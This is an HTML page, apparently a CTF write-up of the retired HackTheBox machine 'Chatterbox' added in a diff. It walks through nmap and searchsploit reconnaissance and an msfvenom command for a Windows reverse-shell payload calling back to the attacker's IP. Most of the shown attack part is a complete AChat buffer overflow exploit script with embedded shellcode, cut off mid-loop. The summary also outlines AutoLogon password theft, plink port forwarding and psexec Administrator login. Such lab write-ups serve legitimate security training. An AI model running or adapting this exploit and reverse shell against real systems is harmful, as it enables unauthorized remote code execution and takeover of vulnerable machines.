@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>pwncone.io</title>
+    <link rel="stylesheet" href="../../../../css/style.css">
+  </head>
+
+<body>
+
+<section>
+
+    <writeup>
+        <h1><strong>hackthebox Chatterbox</strong></h1>
+        <em>Released: 27th January 2018 / Pwned: 30th October 2019 - [+] Solved whilst Retired</em><br>
+        <br>
+        <img alt="images\2-1.png" src="images/2-1.png"><br>
+        <br>
+        This box is similar to Kioptrix 1 except there's a few more steps along the way. Not big ones, though.<br>
+        <br>
+        <a id="h3-1" name="h3-1"></a><strong></strong>
+        <h4><strong>Summary</strong></h4>
+        • Nmap scan the box to find an open port running vulnerable software<br>
+        • Exploit that vulnerable software with a <code>windows/shell/reverse_tcp</code> payload and a <code>exploit/multi/handler</code> listener<br>
+        • Read the registry AutoLogon keys to find a plaintext password<br>
+        • Transfer <code>plink.exe</code> to the target and use it to port forward port 445 to your attacking system<br>
+        • Log in as Administrator using <code>psexec.py</code><br>
+        <br>
+        <a id="h2-1" name="h2-1"></a><strong></strong>
+        <h2><strong>1) Nmap</strong></h2><br>
+        Initial TCP all-ports scan:<br>
+        <code>nmap -p- -T4 -oN nmap/tcp-allports.txt 10.10.10.74</code><br>
+        <br>
+        Run service enumeration, default scripts and OS detection against open TCP ports:<br>
+        <code>nmap -p &lt;open ports&gt; -T4 -sV -sC -O -oN nmap/tcp-openports.txt 10.10.10.74</code><br>
+        <br>
+        -sV service enumeration<br>
+        -sC default scripts<br>
+        -O OS detection<br>
+        -oN default output<br>
+        <br>
+        Results:<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p-&nbsp;-T4&nbsp;-oN&nbsp;nmap/tcp-all.txt&nbsp;10.10.10.74</span><br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE<br>
+                9255<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;mon<br>
+                9256<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;unknown<br>
+                <br>
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nmap&nbsp;-p&nbsp;9255,9256&nbsp;-T4&nbsp;-sV&nbsp;-sC&nbsp;-O&nbsp;-oN&nbsp;nmap/tcp-open.txt&nbsp;10.10.10.74</span><br>
+                [...]<br>
+                <br>
+                PORT&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;STATE&nbsp;SERVICE&nbsp;VERSION<br>
+                9255<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;http&nbsp;&nbsp;&nbsp;&nbsp;AChat&nbsp;chat&nbsp;system&nbsp;httpd<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-server-header<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;AChat<br>
+                <span style="color:#ff9d00;font-weight:700">|</span>_http-title<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;Site&nbsp;doesnt&nbsp;have&nbsp;a&nbsp;title.<br>
+                9256<span style="color:#ff9d00;font-weight:700">/</span>tcp&nbsp;open&nbsp;&nbsp;achat&nbsp;&nbsp;&nbsp;AChat&nbsp;chat&nbsp;system<br>
+                Warning<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;OSScan&nbsp;results&nbsp;may&nbsp;be&nbsp;unreliable&nbsp;because&nbsp;we&nbsp;could&nbsp;not&nbsp;<span style="color:#ff9d00;font-weight:700">find</span>&nbsp;at&nbsp;least&nbsp;1&nbsp;open&nbsp;and&nbsp;1&nbsp;closed&nbsp;port<br>
+                Device&nbsp;type<span style="color:#ff9d00;font-weight:700">:</span>&nbsp;general&nbsp;purpose<span style="color:#ff9d00;font-weight:700">|</span>phone<span style="color:#ff9d00;font-weight:700">|</span>specialized<br>
+                Running&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>JUST&nbsp;GUESSING<span style="color:#ff9d00;font-weight:700">):</span>&nbsp;Microsoft&nbsp;Windows&nbsp;8<span style="color:#ff9d00;font-weight:700">|</span>Phone<span style="color:#ff9d00;font-weight:700">|</span>2008<span style="color:#ff9d00;font-weight:700">|</span>7<span style="color:#ff9d00;font-weight:700">|</span>8.1<span style="color:#ff9d00;font-weight:700">|</span>Vista<span style="color:#ff9d00;font-weight:700">|</span>2012&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>92%<span style="color:#ff9d00;font-weight:700">)</span><br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        Analysis:<br>
+        • <code>9255/http</code> - A website? But it doesn't respond at all.<br>
+        • <code>9256/AChat</code> - A chat client - AChat.<br>
+        <br>
+        <a id="h2-2" name="h2-2"></a><strong></strong>
+        <h2><strong>2) searchsploit AChat</strong></h2><br>
+        AChat, according to the author, is a “simple multi-user chat server/client�.<br>
+        <a href="https://github.com/Avidanborisov/AChat">https://github.com/Avidanborisov/AChat</a><br>
+        The commits on the github page are 7 years old, which made me think it's probably vulnerable.<br>
+        <br>
+        <code>searchsploit</code> for an exploit, and sure enough there's a remote buffer overflow.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#searchsploit&nbsp;-w&nbsp;achat</span><br>
+                ----------------------------------------------------------------------<br>
+                &nbsp;Exploit&nbsp;Title&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;&nbsp;URL<br>
+                ----------------------------------------------------------------------<br>
+                Achat&nbsp;0.150&nbsp;beta7&nbsp;-&nbsp;Remote&nbsp;Buffer&nbsp;Overflow&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>36025<br>
+                Achat&nbsp;0.150&nbsp;beta7&nbsp;-&nbsp;Remote&nbsp;Buffer&nbsp;Overflow&nbsp;<span style="color:#ff9d00;font-weight:700">(</span>Metasploit<span style="color:#ff9d00;font-weight:700">)</span>&nbsp;<span style="color:#ff9d00;font-weight:700">|</span>&nbsp;https<span style="color:#ff9d00;font-weight:700">://</span>www.exploit-db.com<span style="color:#ff9d00;font-weight:700">/</span>exploits<span style="color:#ff9d00;font-weight:700">/</span>36056
+            </div>
+        </div><br>
+        <br>
+        There's both a metasploit module and python script version of the exploit available.<br>
+        Both of them have their own problems (which also caused me a lot of problems).<br>
+        <br>
+        <strong>Metasploit</strong><br>
+        The metasploit module produces encoding errors, and no matter what shellcode or encoding I tried I couldn't get past that error.<br>
+        <br>
+        <strong>Python Script</strong><br>
+        <em>KAhara MAnhara</em>'s python script works depending on the payload you use.<br>
+        • A meterpreter payload - <code>windows/meterpreter/reverse_tcp</code> - dies immediately after the exploit finishes.<br>
+        • But with a standard <code>cmd</code> shell, the connection stays alive - <code>windows/shell/reverse_tcp</code>.<br>
+        <br>
+        Pop a shell on the system with <em>KAhara MAnhara</em>'s exploit script.<br>
+        <a href="https://www.exploit-db.com/exploits/36025">https://www.exploit-db.com/exploits/36025</a><br>
+        <br>
+        <a id="h1-2" name="h1-2"></a><strong></strong>
+        <h1><strong>Gain Access</strong></h1>
+        <br>
+        <a id="h2-3" name="h2-3"></a><strong></strong>
+        <h2><strong>3) AChat pwn</strong></h2><br>
+        <a href="https://www.exploit-db.com/exploits/36025">https://www.exploit-db.com/exploits/36025</a><br>
+        <br>
+        2 parts of the code need changing:<br>
+        • The shellcode<br>
+        • The target IP<br>
+        <br>
+        <a id="h3-2" name="h3-2"></a><strong></strong>
+        <h3><strong>3a) Change target IP</strong></h3><br>
+        Do the easy one first and change the target IP.<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#nano&nbsp;bof.py</span><br>
+                [...]<br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Create&nbsp;a&nbsp;UDP&nbsp;socket</span><br>
+                sock&nbsp;=&nbsp;socket.socket<span style="color:#ff9d00;font-weight:700">(</span>socket.AF_INET,&nbsp;socket.SOCK_DGRAM<span style="color:#ff9d00;font-weight:700">)</span><br>
+                server_address&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">'10.10.10.74'</span>,&nbsp;9256<span style="color:#ff9d00;font-weight:700">)</span>
+            </div>
+        </div><code><br></code><br>
+        <br>
+        <a id="h3-3" name="h3-3"></a><strong></strong>
+        <h3><strong>3b) Replace shellcode</strong></h3><br>
+        The example msfvenom command in the script provides you with a template to generate your own shellcode.<br>
+        We want a shell, and the only that works consistently (for me, at least), is <code>windows/shell/reverse_tcp</code>.<br>
+        <br>
+        Generate your shellcode.<br>
+        (Don't worry about the <code>b</code>'s. They're included for compatibility with python3, but don't cause issues in python2 code.)<br>
+            <div class="codebox">
+                ┌─[root@parrot]─[<span style="color:#ff9d00;font-weight:700">/</span>ctf<span style="color:#ff9d00;font-weight:700">/</span>chatterbox]<br>
+                └──╼&nbsp;<span style="color:#0088ff;font-weight:400">#msfvenom&nbsp;-a&nbsp;x86&nbsp;--platform&nbsp;Windows&nbsp;-p&nbsp;windows/shell/reverse_tcp&nbsp;LHOST=10.10.14.12&nbsp;LPORT=9001&nbsp;BufferRegister=EAX&nbsp;-f&nbsp;python&nbsp;-e&nbsp;x86/unicode_mixed&nbsp;-b&nbsp;'\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'</span><br>
+                [...]
+            </div>
+        </div><br>
+        <br>
+        My full exploit script looks like this:<br>
+            <div class="codebox">
+                <span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Author&nbsp;KAhara&nbsp;MAnhara</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Achat&nbsp;0.150&nbsp;beta7&nbsp;-&nbsp;Buffer&nbsp;Overflow</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Tested&nbsp;on&nbsp;Windows&nbsp;7&nbsp;32bit</span><br>
+                <br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;socket<br>
+                <span style="color:#333333;font-weight:400">import</span>&nbsp;sys,&nbsp;time<br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;msfvenom&nbsp;-a&nbsp;x86&nbsp;--platform&nbsp;Windows&nbsp;-p&nbsp;windows/shell/reverse_tcp&nbsp;LHOST=10.10.14.12&nbsp;LPORT=9001&nbsp;BufferRegister=EAX&nbsp;-f&nbsp;python&nbsp;-e&nbsp;x86/unicode_mixed&nbsp;-b&nbsp;'\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'</span><br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Payload&nbsp;size:&nbsp;808&nbsp;bytes</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;CHANGE&nbsp;SHELLCODE</span><br>
+                buf&nbsp;=&nbsp;&nbsp;b<span style="color:#3ad900;font-weight:400">""</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51\x41\x44\x41"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x5a\x41\x42\x41\x52\x41\x4c\x41\x59\x41\x49\x41\x51"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x41\x49\x41\x51\x41\x49\x41\x68\x41\x41\x41\x5a\x31"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x41\x49\x41\x49\x41\x4a\x31\x31\x41\x49\x41\x49\x41"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x42\x41\x42\x41\x42\x51\x49\x31\x41\x49\x51\x49\x41"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x49\x51\x49\x31\x31\x31\x41\x49\x41\x4a\x51\x59\x41"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x5a\x42\x41\x42\x41\x42\x41\x42\x41\x42\x6b\x4d\x41"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x47\x42\x39\x75\x34\x4a\x42\x39\x6c\x6a\x48\x65\x32"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x69\x70\x4b\x50\x6b\x50\x31\x50\x34\x49\x78\x65\x4d"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x61\x57\x50\x32\x44\x34\x4b\x72\x30\x30\x30\x54\x4b"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x30\x52\x7a\x6c\x54\x4b\x62\x32\x4e\x34\x64\x4b\x74"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x32\x4d\x58\x6c\x4f\x46\x57\x6d\x7a\x4b\x76\x50\x31"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x4b\x4f\x54\x6c\x6d\x6c\x6f\x71\x73\x4c\x6c\x42\x4e"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x4c\x6d\x50\x49\x31\x66\x6f\x4a\x6d\x49\x71\x68\x47"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x79\x52\x4c\x32\x6e\x72\x4f\x67\x74\x4b\x50\x52\x4e"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x30\x34\x4b\x6f\x5a\x4d\x6c\x54\x4b\x70\x4c\x4c\x51"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x64\x38\x67\x73\x50\x48\x69\x71\x78\x51\x4e\x71\x54"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x4b\x4e\x79\x6b\x70\x6a\x61\x46\x73\x52\x6b\x4e\x69"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x4d\x48\x79\x53\x4c\x7a\x30\x49\x72\x6b\x4c\x74\x52"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x6b\x79\x71\x79\x46\x50\x31\x4b\x4f\x64\x6c\x69\x31"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x68\x4f\x5a\x6d\x6d\x31\x39\x37\x4f\x48\x77\x70\x61"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x65\x59\x66\x6b\x53\x71\x6d\x6b\x48\x4d\x6b\x73\x4d"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x4c\x64\x61\x65\x38\x64\x4e\x78\x44\x4b\x32\x38\x6b"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x74\x7a\x61\x56\x73\x6f\x76\x34\x4b\x4a\x6c\x70\x4b"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x72\x6b\x50\x58\x4b\x6c\x79\x71\x68\x53\x42\x6b\x4a"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x64\x44\x4b\x49\x71\x76\x70\x64\x49\x4f\x54\x4c\x64"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x4b\x74\x31\x4b\x71\x4b\x31\x51\x51\x49\x71\x4a\x70"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x51\x49\x6f\x39\x50\x71\x4f\x6f\x6f\x50\x5a\x64\x4b"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x4e\x32\x68\x6b\x44\x4d\x31\x4d\x73\x38\x6c\x73\x50"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x32\x79\x70\x49\x70\x50\x68\x43\x47\x43\x43\x4d\x62"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x31\x4f\x51\x44\x53\x38\x30\x4c\x34\x37\x4f\x36\x4c"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x47\x63\x59\x4a\x48\x6b\x4f\x66\x70\x54\x78\x62\x70"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x5a\x61\x59\x70\x4b\x50\x4f\x39\x67\x54\x61\x44\x72"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x30\x53\x38\x6b\x79\x33\x50\x70\x6b\x4b\x50\x4b\x4f"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x6a\x35\x31\x5a\x6b\x5a\x61\x58\x4a\x6a\x4c\x4a\x4a"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x6e\x4c\x4c\x62\x48\x5a\x62\x49\x70\x6c\x63\x6b\x79"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x32\x69\x77\x76\x62\x30\x42\x30\x32\x30\x50\x50\x4d"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x70\x52\x30\x61\x30\x6e\x70\x42\x48\x78\x6a\x6a\x6f"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x67\x6f\x77\x70\x79\x6f\x76\x75\x63\x67\x31\x5a\x5a"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x70\x30\x56\x71\x47\x70\x68\x34\x59\x44\x65\x43\x44"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x33\x31\x59\x6f\x6a\x35\x42\x65\x37\x50\x72\x54\x7a"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x6a\x49\x6f\x50\x4e\x79\x78\x34\x35\x48\x6c\x69\x58"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x32\x47\x69\x70\x4b\x50\x49\x70\x32\x4a\x4b\x50\x70"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x6a\x7a\x64\x62\x36\x62\x37\x73\x38\x6b\x52\x77\x69"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x36\x68\x4f\x6f\x4b\x4f\x4a\x35\x55\x33\x78\x78\x69"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x70\x31\x6e\x6c\x76\x54\x4b\x6e\x56\x31\x5a\x51\x30"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x50\x68\x4d\x30\x4e\x30\x6d\x30\x4b\x50\x42\x36\x52"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x4a\x39\x70\x4f\x78\x6e\x78\x35\x54\x4f\x63\x47\x75"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x4b\x4f\x78\x55\x55\x43\x70\x53\x50\x6a\x39\x70\x31"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x46\x70\x53\x32\x37\x42\x48\x4b\x52\x66\x79\x58\x48"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x71\x4f\x39\x6f\x7a\x35\x45\x33\x4a\x58\x4b\x50\x73"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x4d\x6d\x58\x71\x48\x43\x38\x69\x70\x6f\x50\x6b\x50"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x6d\x30\x4f\x7a\x69\x70\x52\x30\x73\x38\x4a\x6b\x4c"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x6f\x4c\x4f\x30\x30\x6b\x4f\x66\x75\x61\x47\x50\x68"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x70\x75\x32\x4e\x70\x4d\x43\x31\x59\x6f\x48\x55\x4f"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x6e\x61\x4e\x49\x6f\x4c\x4c\x4d\x54\x7a\x6f\x65\x35"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x64\x30\x4b\x4f\x4b\x4f\x49\x6f\x6b\x39\x33\x6b\x59"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x6f\x4b\x4f\x79\x6f\x79\x71\x59\x33\x4f\x39\x35\x76"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x62\x55\x55\x71\x37\x53\x35\x6b\x38\x70\x36\x55\x55"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x52\x4e\x76\x31\x5a\x59\x70\x31\x43\x49\x6f\x67\x65"</span><br>
+                buf&nbsp;+=&nbsp;b<span style="color:#3ad900;font-weight:400">"\x41\x41"</span><br>
+                <br>
+                <span style="color:#0088ff;font-weight:400">#&nbsp;Create&nbsp;a&nbsp;UDP&nbsp;socket</span><br>
+                sock&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_DGRAM)<br>
+                server_address&nbsp;=&nbsp;(<span style="color:#3ad900;font-weight:400">'10.10.10.74'</span>,&nbsp;<span style="color:#ff0044;font-weight:400">9256</span>) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">#&nbsp;CHANGE&nbsp;TARGET&nbsp;IP</span><br>
+                <br>
+                fs&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"\x55\x2A\x55\x6E\x58\x6E\x05\x14\x11\x6E\x2D\x13\x11\x6E\x50\x6E\x58\x43\x59\x39"</span><br>
+                p&nbsp;&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"A0000000002#Main"</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"\x00"</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"Z"</span>*<span style="color:#ff0044;font-weight:400">114688</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"\x00"</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">10</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"\x00"</span><br>
+                p&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"A0000000002#Main"</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"\x00"</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">57288</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"AAAAASI"</span>*<span style="color:#ff0044;font-weight:400">50</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*(<span style="color:#ff0044;font-weight:400">3750</span>-<span style="color:#ff0044;font-weight:400">46</span>)<br>
+                p&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x62"</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">45</span><br>
+                p&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x61\x40"</span>&nbsp;<br>
+                p&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x2A\x46"</span><br>
+                p&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x43\x55\x6E\x58\x6E\x2A\x2A\x05\x14\x11\x43\x2d\x13\x11\x43\x50\x43\x5D"</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"C"</span>*<span style="color:#ff0044;font-weight:400">9</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"\x60\x43"</span><br>
+                p&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x61\x43"</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"\x2A\x46"</span><br>
+                p&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x2A"</span>&nbsp;+&nbsp;fs&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"C"</span>&nbsp;*&nbsp;(<span style="color:#ff0044;font-weight:400">157</span>-<span style="color:#ff9d00;font-weight:700">len</span>(fs)-&nbsp;<span style="color:#ff0044;font-weight:400">31</span>-<span style="color:#ff0044;font-weight:400">3</span>)<br>
+                p&nbsp;+=&nbsp;buf&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>&nbsp;*&nbsp;(<span style="color:#ff0044;font-weight:400">1152</span>&nbsp;-&nbsp;<span style="color:#ff9d00;font-weight:700">len</span>(buf))<br>
+                p&nbsp;+=&nbsp;<span style="color:#3ad900;font-weight:400">"\x00"</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"A"</span>*<span style="color:#ff0044;font-weight:400">10</span>&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"\x00"</span><br>
+                <br>
+                <span style="color:#ff9d00;font-weight:700">print</span>&nbsp;<span style="color:#3ad900;font-weight:400">"----&gt;{P00F}!"</span><br>
+                i=<span style="color:#ff0044;font-weight:400">0</span><br>
+                <span style="color:#ff9d00;font-weight:700">while</span>&nbsp;i&lt;<span style="color:#ff9d00;font-weight:700">len</span>(p):<br>
+                &nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;i&nbsp;&gt;&nbsp;<span style="color:#ff0044;font-weight:400">172000</span>:<br>
